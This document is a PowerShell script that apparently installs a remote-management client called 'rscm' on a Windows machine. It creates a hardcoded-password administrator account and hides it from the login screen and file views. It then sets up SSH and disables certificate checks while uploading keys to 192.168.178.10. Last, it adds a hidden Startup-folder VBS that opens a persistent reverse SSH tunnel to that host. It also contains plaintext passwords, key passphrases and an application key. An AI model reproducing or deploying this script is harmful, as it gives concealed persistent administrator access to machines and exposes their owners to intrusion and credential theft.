Install-PackageProvider -Name "NuGet" -MinimumVersion "2.8.5.201" -Force
Set-ExecutionPolicy Unrestricted -force 

#Create new User that can be managed remotely
$password =  ConvertTo-SecureString '4XVSp4aUUUcWPYLW' -asplaintext -force
New-LocalUser 'rscm' -Password $password

#Make user Administrator
Add-LocalGroupMember -Group 'Administratoren' -Member 'rscm'



#Remove User from Welcome Screen
$path = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
New-Item $path -Force | New-ItemProperty -Name 'rscm' -Value 0 -PropertyType DWord -Force

#Install
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0
Install-Module -Force OpenSSHUtils


#activate service
Set-Service ssh-agent -StartupType Automatic
Start-Service ssh-agent
Set-Service sshd -StartupType Automatic
Start-Service sshd

Add-Content C:\ProgramData\ssh\sshd_config  "PubkeyAuthentication yes"

Restart-Service sshd


#firwall
Enable-NetFirewallRule -Name "OpenSSH-Server-In-TCP"

#create keys
#Enter rscm
$wshell = New-Object -ComObject Wscript.Shell
$wshell.Run("ssh rscm@localhost")
Start-Sleep -m 1000
$wshell.SendKeys("yes{ENTER}")
Start-Sleep -m 1000
$wshell.SendKeys("4XVSp4aUUUcWPYLW{ENTER}")
Start-Sleep -m 1000
$wshell.SendKeys("mkdir C:\Users\rscm\.ssh{ENTER}")
Start-Sleep -m 1000
$wshell.SendKeys("ssh-keygen.exe -f C:\Users\rscm\.ssh\id_rsa -N '=ZDTjEnn0HQndA1s'{ENTER}")
Start-Sleep -m 1000
$wshell.SendKeys("exit{ENTER}")
#create own keys
ssh-keygen.exe -f $HOME\.ssh\id_rsa -N 'gSBqexSqTNzpA9!F'

$wshell2 = New-Object -ComObject Wscript.Shell
$wshell2.Run("ssh-add.exe $HOME\.ssh\id_rsa")
Start-Sleep -m 1000
$wshell2.SendKeys("gSBqexSqTNzpA9!F{ENTER}")

#add keys
$pubKeyRSCMUser = [IO.File]::ReadAllText("C:\Users\rscm\.ssh\id_rsa.pub")
$pubKeyLocalUser = [IO.File]::ReadAllText("$HOME\.ssh\id_rsa.pub")
$pubKeyServer = 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC+Wz5RK3pjdP6nuu3W80YfvAAhUBKxOfOj3GWjd4gN21t98A8c548HYhlnStLE5GZxN1uqsLSg5bPkDSqwLBYZ1e/DZxCWTtaK+Ef9hzxhRV4EPX82k4QHI3HHccqpUA3f5/gpkmcrrLxeDohpUPwWBLwQroyD43ZpCfRzU2C5F2FzA1KX4DLRJAv5GwiCNIuGWv8rBH7o7BBp5Mj+/8OtfUDPshaA2Bcte45FwI05ak8sTJfoJq80QWgoAJPQjgRMB0U3OG1KJX5pkpBYPjUfcDholBDroohqdmvMjqXt15FocIEp3EnYsBCOSKcRGTMmXErwGvMvk/inXabI4rsL rscmserver@DESKTOP-QH02IEJ'
Add-Content C:\Users\rscm\.ssh\authorized_keys $pubKeyLocalUser
Add-Content C:\Users\rscm\.ssh\authorized_keys $pubKeyRSCMUser
Add-Content C:\Users\rscm\.ssh\authorized_keys $pubKeyServer

#adjist authorized_keys file rights
#@source http://blog.dbsnet.fr/remove-users-group-from-acl
# File / folder path
$file = 'C:\Users\rscm\.ssh\authorized_keys' 

# 1. Remove NTFS rights inheritance 
$acl = Get-Acl -Path $file
$acl.SetAccessRuleProtection($True, $True)
Set-Acl -Path $file -AclObject $acl

# 2. Remove the "Users" group from ACL
$colRights = [System.Security.AccessControl.FileSystemRights] "FullControl" 
$InheritanceFlag = [System.Security.AccessControl.InheritanceFlags]::None
$PropagationFlag = [System.Security.AccessControl.PropagationFlags]::None 
$objType = [System.Security.AccessControl.AccessControlType]::Allow 

$i=0
$sids = wmic useraccount get sid | Where-Object { $i % 2 -eq 0; $i++ }

For ($i=1; $i -le $sids.Length-2; $i++) {
  $objUser = New-Object System.Security.Principal.SecurityIdentifier($sids[$i].Trim()) 
  $objACE = New-Object System.Security.AccessControl.FileSystemAccessRule($objUser, $colRights, $InheritanceFlag, $PropagationFlag, $objType) 
  $objACL = Get-Acl $file 
  $objACL.RemoveAccessRuleAll($objACE) 
  Set-Acl $file $objACL
    }


[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

#send public keygen
$content = [IO.File]::ReadAllText("$HOME\.ssh\id_rsa.pub")
$params = @{"applikationKey"="2f0AzI6GkRa=bRTXwmpFIAiFK3SLWQUj";
    "clientRSAPublicKey"= $content;
}

$reqBody = ($params|ConvertTo-Json);
$Body = [byte[]][char[]]$reqBody;
$Request = [System.Net.HttpWebRequest]::CreateHttp('https://192.168.178.10:8443/ClientAuthentication/SendPublicKey');
$Request.Method = 'POST';
$Request.ContentType="application/json";
$Stream = $Request.GetRequestStream();
$Stream.Write($Body, 0, $Body.Length);
$Request.GetResponse();


[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$false}


#test connect
Add-Content $Home\.ssh\known_hosts "192.168.178.10 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAYu3YwUiKt2/pnh8wiXHHAHLhGB8xhrsKSE1vwpoTO89LYFh9Pf1MGGdoDhLzKLTlJRKVmu6bq5ZNCzQmKfHdM="

#create bat connect script
mkdir $HOME\rscm
Add-Content $HOME\rscm\rscmServerConnect.vbs 'Set objShell = WScript.CreateObject("WScript.Shell")'
Add-Content $HOME\rscm\rscmServerConnect.vbs 'objShell.Run "cmd /c ssh -f -N -T -R22001:localhost:22 rscmserver@192.168.178.10", 0, True'
#create script helper



#Hide User Folder
Get-ChildItem -path 'C:\Users\rscm' -Force | foreach {$_.attributes = "Hidden"}

$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($env:USERPROFILE + '\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\rscm.lnk')
$Shortcut.TargetPath = "$HOME\rscm\rscmServerConnect.vbs"
$Shortcut.Save()

Invoke-Item ($env:USERPROFILE + '\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\rscm.lnk')






